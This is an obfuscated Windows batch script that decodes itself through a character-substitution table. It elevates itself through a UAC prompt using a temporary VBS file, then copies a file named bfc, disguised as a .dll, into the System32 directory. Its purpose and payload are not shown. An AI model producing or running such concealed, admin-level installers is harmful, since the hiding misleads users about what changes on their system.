@echo off&(if defined @lo@ goto ¡)&setlocal disableDelayedExpansion&for /f "delims=: tokens=2" %%A in ('chcp') do set "@chcp@=chcp %%A>nul"&chcp 708>nul&set ^"@args@=%*"
set "@lo@= !#$&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~""
set "@hi@=¡¢¤¥§¨©ª«¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ£"
(setlocal enableDelayedExpansion&for /l %%N in (0 1 93) do set "!@hi@:~%%N,1!=!@lo@:~%%N,1!")&cmd /c ^""%~f0" !@args@!"
%@chcp@%&exit /b
:¡
%Á%%Æ%%Ä%%É%%Ð%%¡%%Ð%%Ç%%Ç%
::%¡%%Â%%Å%%Î%%Ê%%Ï%
:-------------------------------------
%Ó%%Æ%%Î%%¡%%¡%%®%%®%%¿%%¡%%Ä%%é%%æ%%ä%%ì%%¡%%ç%%ð%%ó%%¡%%ñ%%æ%%ó%%î%%ê%%ô%%ô%%ê%%ð%%ï%%ô%
%¡%%¡%%¡%%¡%%Ê%%Ç%%¡%%£%%PROCESSOR_ARCHITECTURE%%£%%¡%%Æ%%Ò%%Ö%%¡%%£%%â%%î%%å%%·%%µ%%£%%¡%%©%
%¿%%ï%%ö%%í%%¡%%³%%¿%%§%%²%%¡%%£%%SYSTEMROOT%%Ý%%Ô%%ú%%ô%%Ø%%Ð%%Ø%%·%%µ%%Ý%%ä%%â%%ä%%í%%ô%%¯%%æ%%ù%%æ%%£%%¡%%£%%SYSTEMROOT%%Ý%%Ô%%ú%%ô%%Ø%%Ð%%Ø%%·%%µ%%Ý%%ä%%ð%%ï%%ç%%ê%%è%%Ý%%ô%%ú%%ô%%õ%%æ%%î%%£%
%ª%%¡%%Æ%%Í%%Ô%%Æ%%¡%%©%
%¿%%ï%%ö%%í%%¡%%³%%¿%%§%%²%%¡%%£%%SYSTEMROOT%%Ý%%ô%%ú%%ô%%õ%%æ%%î%%´%%³%%Ý%%ä%%â%%ä%%í%%ô%%¯%%æ%%ù%%æ%%£%%¡%%£%%SYSTEMROOT%%Ý%%ô%%ú%%ô%%õ%%æ%%î%%´%%³%%Ý%%ä%%ð%%ï%%ç%%ê%%è%%Ý%%ô%%ú%%ô%%õ%%æ%%î%%£%
%ª%

%Ó%%Æ%%Î%%¡%%®%%®%%¿%%¡%%Ê%%ç%%¡%%æ%%ó%%ó%%ð%%ó%%¡%%ç%%í%%â%%è%%¡%%ô%%æ%%õ%%­%%¡%%ø%%æ%%¡%%å%%ð%%¡%%ï%%ð%%õ%%¡%%é%%â%%÷%%æ%%¡%%â%%å%%î%%ê%%ï%%¯%
%ê%%ç%%¡%%¨%%errorlevel%%¨%%¡%%Ï%%Æ%%Ò%%¡%%¨%%±%%¨%%¡%%©%
%¡%%¡%%¡%%¡%%æ%%ä%%é%%ð%%¡%%Ñ%%Í%%Æ%%Â%%Ô%%Æ%%¡%%È%%Ó%%Â%%Ï%%Õ%%¡%%Ñ%%Æ%%Ó%%Î%%Ê%%Ô%%Ô%%Ê%%Ð%%Ï%
%¡%%¡%%¡%%¡%%è%%ð%%õ%%ð%%¡%%Ö%%Â%%Ä%%Ñ%%ó%%ð%%î%%ñ%%õ%
%ª%%¡%%æ%%í%%ô%%æ%%¡%%©%%¡%%è%%ð%%õ%%ð%%¡%%è%%ð%%õ%%Â%%å%%î%%ê%%ï%%¡%%ª%

:UACPrompt
%¡%%¡%%¡%%¡%%æ%%ä%%é%%ð%%¡%%Ô%%æ%%õ%%¡%%Ö%%Â%%Ä%%¡%%¾%%¡%%Ä%%ó%%æ%%â%%õ%%æ%%Ð%%ã%%ë%%æ%%ä%%õ%%ß%%©%%£%%Ô%%é%%æ%%í%%í%%¯%%Â%%ñ%%ñ%%í%%ê%%ä%%â%%õ%%ê%%ð%%ï%%£%%ß%%ª%%¡%%¿%%¡%%£%%temp%%Ý%%è%%æ%%õ%%â%%å%%î%%ê%%ï%%¯%%÷%%ã%%ô%%£%
%¡%%¡%%¡%%¡%%ô%%æ%%õ%%¡%%ñ%%â%%ó%%â%%î%%ô%%¾%%¡%%*
%¡%%¡%%¡%%¡%%æ%%ä%%é%%ð%%¡%%Ö%%Â%%Ä%%¯%%Ô%%é%%æ%%í%%í%%Æ%%ù%%æ%%ä%%ö%%õ%%æ%%¡%%£%%ä%%î%%å%%¯%%æ%%ù%%æ%%£%%­%%¡%%£%%°%%ä%%¡%%£%%£%%~s0%£%%£%%¡%%params:"=""%%£%%­%%¡%%£%%£%%­%%¡%%£%%ó%%ö%%ï%%â%%ô%%£%%­%%¡%%²%%¡%%¿%%¿%%¡%%£%%temp%%Ý%%è%%æ%%õ%%â%%å%%î%%ê%%ï%%¯%%÷%%ã%%ô%%£%

%¡%%¡%%¡%%¡%%£%%temp%%Ý%%è%%æ%%õ%%â%%å%%î%%ê%%ï%%¯%%÷%%ã%%ô%%£%
%¡%%¡%%¡%%¡%%å%%æ%%í%%¡%%£%%temp%%Ý%%è%%æ%%õ%%â%%å%%î%%ê%%ï%%¯%%÷%%ã%%ô%%£%
%¡%%¡%%¡%%¡%%æ%%ù%%ê%%õ%%¡%%°%%Ã%

:gotAdmin
%¡%%¡%%¡%%¡%%ñ%%ö%%ô%%é%%å%%¡%%£%%CD%%£%
%¡%%¡%%¡%%¡%%Ä%%Å%%¡%%°%%Å%%¡%%£%%~dp0%£%
:-------------------------------------- 
%ä%%í%%ô%
%õ%%ê%%õ%%í%%æ%%¡%%ê%%ï%%ô%%õ%%â%%í%%í%%ê%%ï%%è%%¯%%¯%%¯%
%æ%%ä%%é%%ð%%¡%%ê%%ï%%ô%%õ%%â%%í%%í%%ê%%ï%%è%%¡%%ã%%ç%%ä%
%ó%%æ%%ï%%¡%%ã%%ç%%ä%%¯%%å%%í%%í%%¡%%ã%%ç%%ä%%¯%%ã%%â%%õ%
%ä%%í%%ô%
%æ%%ä%%é%%ð%%¡%%ê%%ï%%ô%%õ%%â%%í%%í%%ê%%ï%%è%%¡%%ã%%ç%%ä%
%õ%%ê%%î%%æ%%ð%%ö%%õ%%¡%%®%%õ%%¡%%²%%¡%%®%%ï%%ð%%ã%%ó%%æ%%â%%ì%%¡%%¿%%õ%
%ä%%ð%%ñ%%ú%%¡%%ã%%ç%%ä%%¯%%ã%%â%%õ%%¡%%Ä%%»%%Ý%%Ø%%ê%%ï%%å%%ð%%ø%%ô%%Ý%%Ô%%ú%%ô%%õ%%æ%%î%%´%%³%
%ä%%í%%ô%
%õ%%ê%%î%%æ%%ð%%ö%%õ%%¡%%®%%õ%%¡%%´%%¡%%®%%ï%%ð%%ã%%ó%%æ%%â%%ì%%¡%%¿%%õ%
%ó%%æ%%ï%%¡%%ã%%ç%%ä%%¯%%ã%%â%%õ%%¡%%ã%%ç%%ä%%¯%%å%%í%%í%
%ä%%í%%ô%
%æ%%ä%%é%%ð%%¡%%å%%ð%%ï%%æ%%¢%
%õ%%ê%%î%%æ%%ð%%ö%%õ%%¡%%®%%õ%%¡%%´%%¡%%®%%ï%%ð%%ã%%ó%%æ%%â%%ì%%¡%%¿%%õ%
%å%%æ%%í%%¡%%õ%
%æ%%ù%%ê%%õ%
